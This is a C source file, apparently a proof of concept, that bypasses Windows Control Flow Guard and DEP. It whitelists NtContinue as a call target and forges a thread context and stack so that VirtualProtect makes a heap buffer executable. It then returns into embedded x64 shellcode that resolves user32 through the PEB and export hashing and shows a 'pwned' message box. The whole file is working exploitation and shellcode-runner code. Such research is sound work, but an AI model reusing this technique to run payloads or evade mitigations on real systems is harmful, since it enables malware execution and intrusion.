#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

/*

EXE works with WinExec and VirtualProtect on 8.1 and 10.
Does not throw the invalid param error observed in iexplore.exe.

*/
typedef NTSTATUS(NTAPI* NtContinue_t)(CONTEXT *);

uint8_t Shellcode[] =
"\x48\x83\xec\x08\x40\x80\xe4\xf7\x48\xc7\xc1\x88\x4e\x0d\x00\xe8"
"\x91\x00\x00\x00\x48\x89\xc7\x48\xc7\xc2\x86\x57\x0d\x00\x48\x89"
"\xf9\xe8\xde\x00\x00\x00\x48\xb9\x75\x73\x65\x72\x33\x32\x00\x00"
"\x51\x48\x89\xe1\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x83\xec\x08"
"\x40\x80\xe4\xf7\xff\xd0\x48\x89\xec\x5d\x48\xc7\xc2\x1a\xb8\x06"
"\x00\x48\x89\xc1\xe8\xab\x00\x00\x00\x4d\x31\xc9\x48\xb9\x70\x77"
"\x6e\x65\x64\x00\x00\x00\x51\x49\x89\xe0\x48\xc7\xc1\x6e\x65\x74"
"\x00\x51\x48\xb9\x65\x73\x74\x2d\x6f\x72\x72\x2e\x51\x48\xb9\x77"
"\x77\x77\x2e\x66\x6f\x72\x72\x51\x48\x89\xe2\x48\x31\xc9\x55\x48"
"\x89\xe5\x48\x83\xec\x20\x48\x83\xec\x08\x40\x80\xe4\xf7\xff\xd0"
"\x48\x89\xec\x5d\xc3\x41\x50\x57\x56\x49\x89\xc8\x48\xc7\xc6\x60"
"\x00\x00\x00\x65\x48\xad\x48\x8b\x40\x18\x48\x8b\x78\x30\x48\x89"
"\xfe\x48\x31\xc0\xeb\x05\x48\x39\xf7\x74\x34\x48\x85\xf6\x74\x2f"
"\x48\x8d\x5e\x38\x48\x85\xdb\x74\x1a\x48\xc7\xc2\x01\x00\x00\x00"
"\x48\x8b\x4b\x08\x48\x85\xc9\x74\x0a\xe8\xa7\x01\x00\x00\x4c\x39"
"\xc0\x74\x08\x48\x31\xc0\x48\x8b\x36\xeb\xcb\x48\x8b\x46\x10\x5e"
"\x5f\x41\x58\xc3\x55\x48\x89\xe5\x48\x81\xec\x50\x02\x00\x00\x57"
"\x56\x48\x89\x4d\xf8\x48\x89\x55\xf0\x48\x31\xdb\x8b\x59\x3c\x48"
"\x01\xd9\x48\x83\xc1\x18\x48\x8b\x75\xf8\x48\x31\xdb\x8b\x59\x70"
"\x48\x01\xde\x48\x89\x75\xe8\x8b\x41\x74\x89\x45\xc0\x48\x8b\x45"
"\xf8\x8b\x5e\x20\x48\x01\xd8\x48\x89\x45\xe0\x48\x8b\x45\xf8\x48"
"\x31\xdb\x8b\x5e\x24\x48\x01\xd8\x48\x89\x45\xd8\x48\x8b\x45\xf8"
"\x8b\x5e\x1c\x48\x01\xd8\x48\x89\x45\xd0\x48\x31\xf6\x48\x89\x75"
"\xc8\x48\x8b\x45\xe8\x8b\x40\x18\x48\x39\xf0\x0f\x86\x09\x01\x00"
"\x00\x48\x89\xf0\x48\x8d\x0c\x85\x00\x00\x00\x00\x48\x8b\x55\xe0"
"\x48\x8b\x45\xf8\x8b\x1c\x11\x48\x01\xd8\x48\x31\xd2\x48\x89\xc1"
"\xe8\xf0\x00\x00\x00\x3b\x45\xf0\x0f\x85\xd3\x00\x00\x00\x48\x89"
"\xf0\x48\x8d\x14\x00\x48\x8b\x45\xd8\x48\x0f\xb7\x04\x02\x48\x8d"
"\x0c\x85\x00\x00\x00\x00\x48\x8b\x55\xd0\x48\x8b\x45\xf8\x8b\x1c"
"\x11\x48\x01\xd8\x48\x89\x45\xc8\x48\x8b\x4d\xe8\x48\x89\xca\x48"
"\x31\xdb\x8b\x5d\xc0\x48\x01\xda\x48\x39\xc8\x0f\x8c\x99\x00\x00"
"\x00\x48\x39\xd0\x0f\x8d\x90\x00\x00\x00\x48\xc7\x45\xc8\x00\x00"
"\x00\x00\x48\x31\xc9\x90\x48\x8d\x9d\xb0\xfd\xff\xff\x8a\x14\x08"
"\x80\xfa\x00\x74\x28\x80\xfa\x2e\x75\x19\xc7\x03\x2e\x64\x6c\x6c"
"\x48\x83\xc3\x04\xc6\x03\x00\x48\x8d\x9d\xb0\xfe\xff\xff\x48\xff"
"\xc1\xeb\xda\x88\x13\x48\xff\xc1\x48\xff\xc3\xeb\xd0\xc6\x03\x00"
"\x48\x31\xd2\x48\x8d\x8d\xb0\xfd\xff\xff\xe8\x46\x00\x00\x00\x48"
"\x89\xc1\xe8\x4e\xfe\xff\xff\x48\x85\xc0\x74\x2e\x48\x89\x45\xb8"
"\x48\x31\xd2\x48\x8d\x8d\xb0\xfe\xff\xff\xe8\x26\x00\x00\x00\x48"
"\x89\xc2\x48\x8b\x4d\xb8\xe8\x89\xfe\xff\xff\x48\x89\x45\xc8\xeb"
"\x09\x48\xff\xc6\x90\xe9\xe7\xfe\xff\xff\x48\x8b\x45\xc8\x5e\x5f"
"\x48\x89\xec\x5d\xc3\x57\x48\x89\xd7\x48\x31\xdb\x80\x39\x00\x74"
"\x1a\x0f\xb6\x01\x0c\x60\x0f\xb6\xd0\x01\xd3\x48\xd1\xe3\x48\xff"
"\xc1\x48\x85\xff\x74\xe6\x48\xff\xc1\xeb\xe1\x48\x89\xd8\x5f\xc3";

typedef BOOL(WINAPI* SetProcessValidCallTargets_t)(HANDLE, void*, SIZE_T, ULONG, CFG_CALL_TARGET_INFO*);

bool DECLSPEC_GUARDNOCF PortableSetCallTargetCfg(HANDLE hProcess, void* pAddress, SIZE_T RegionSize, ULONG ulTargetCount, CFG_CALL_TARGET_INFO* pControlGuardInfo) { // DECLSPEC_GUARDNOCF disables CFG for this function, which allows SetProcessValidCallTargets to be called dynamically (otherwise it would have to be statically linked or it would trigger a CFG exception due to being an unknown address).
	static SetProcessValidCallTargets_t fnSetProcessValidCallTargets = (SetProcessValidCallTargets_t)GetProcAddress(GetModuleHandleW(L"Kernelbase.dll"), "SetProcessValidCallTargets");
	return fnSetProcessValidCallTargets == nullptr ? false : fnSetProcessValidCallTargets(hProcess, pAddress, RegionSize, ulTargetCount, pControlGuardInfo);
}

bool LegitimizeCfgRegion(uint8_t* pTargetAddress, uint32_t dwMemRegionSize) {
	MEMORY_BASIC_INFORMATION Mbi = { 0 };

	if (VirtualQuery(pTargetAddress, &Mbi, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
		uint32_t dwTargetOffset = (pTargetAddress - Mbi.BaseAddress);
		uint32_t dwOffset = 0;

		do { // In the event that a region size of 0 is passed, only the specified address itself will be whitelisted.
			CFG_CALL_TARGET_INFO ControlGuardInfo = { 0 };

			ControlGuardInfo.Flags = CFG_CALL_TARGET_VALID;
			ControlGuardInfo.Offset = (dwTargetOffset + dwOffset);

			if (!PortableSetCallTargetCfg(GetCurrentProcess(), Mbi.BaseAddress, Mbi.RegionSize, 1, &ControlGuardInfo)) { // Error 87 is CFG is not enabled in the PE for this process itself (whether its in the DLL is irrelevant)
				return false;
			}

			dwOffset += 16;
		} while (dwOffset < dwMemRegionSize); // "The call targets specified should be 16-byte aligned and in ascending order." https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-setprocessvalidcalltargets
	}

	return true;
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	NtContinue_t NtContinue = (NtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
	printf("... successfully resolved NtContinue to 0x%p\r\n", NtContinue);
	if (LegitimizeCfgRegion((uint8_t *)NtContinue, 0)) {
		printf("... successfully set NtContinue as valid CFG call target\r\n");

		CONTEXT NewCtx = { 0 };
		uint32_t dwOldProtect = 0;
		NewCtx.ContextFlags = CONTEXT_ALL;

		if (GetThreadContext(GetCurrentThread(), &NewCtx)) {
			printf("... current RCX: 0x%p\r\n", NewCtx.Rcx);
			printf("... current RSP: 0x%p\r\n", NewCtx.Rsp);
			//uint8_t* pArtificialStack = (uint8_t *)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
			uint8_t* pArtificialStack = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10000);
			printf("... artificial stack alloc base: 0x%p\r\n", pArtificialStack);
			uint8_t* pShellcodeBuf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x10000);
			while ((uint64_t)pShellcodeBuf % 0x1000 != 0) pShellcodeBuf++;
			memcpy(pShellcodeBuf, Shellcode, sizeof(Shellcode));
			//pShellcodeBuf = Shellcode;
			pArtificialStack += 0x4000; // Using 0x2000 broke it when ran as an EXE but not in a debugger. Using VirtualAlloc worked presumably because when it went OOB the mem was still valid.
			pArtificialStack += 8;
			*(uint64_t*)&pArtificialStack[0] = (DWORD64)pShellcodeBuf;
			//*(uint64_t*)&pArtificialStack[-8] = (DWORD64)pShellcodeBuf;
			//*(uint64_t*)&pArtificialStack[8] = (DWORD64)pShellcodeBuf;
			//*(uint64_t*)&pArtificialStack[-16] = (DWORD64)pShellcodeBuf;
			//*(uint64_t*)&pArtificialStack[16] = (DWORD64)pShellcodeBuf;

			/*
			pArtificialStack = (uint8_t *)NewCtx.Rsp;
			pArtificialStack -= 0x1000; // Needed when original stack is used otherwise it will be contaminated leading up to the NtContinue call
			*(uint64_t*)&pArtificialStack[0] = (DWORD64)pShellcodeBuf;
			*/

			printf("... new RSP: 0x%p\r\n", pArtificialStack);

			/*
			NewCtx.Rcx = (DWORD64)"notepad.exe";
			NewCtx.Rdx = SW_SHOW;
			NewCtx.Rip = (DWORD64)WinExec;
			*/

			printf("... shellcode in .data: 0x%p, shellcode on heap: 0x%p\r\n", Shellcode, pShellcodeBuf);
			NewCtx.Rcx = (DWORD64)pShellcodeBuf;
			NewCtx.Rdx = sizeof(Shellcode);
			NewCtx.R8 = PAGE_EXECUTE_READWRITE;
			NewCtx.R9 = (DWORD64)&dwOldProtect;
			NewCtx.Rip = (DWORD64)VirtualProtect;

			NewCtx.Rsp = (DWORD64)pArtificialStack;
			//NewCtx.Rsp -= 0x8;
			NewCtx.ContextFlags = CONTEXT_ALL;
			NTSTATUS NtStatus = NtContinue(&NewCtx);
			printf("... NtStatus from NtContinue: 0x%08x\r\n", NtStatus);
		}
	}

	return 0;
}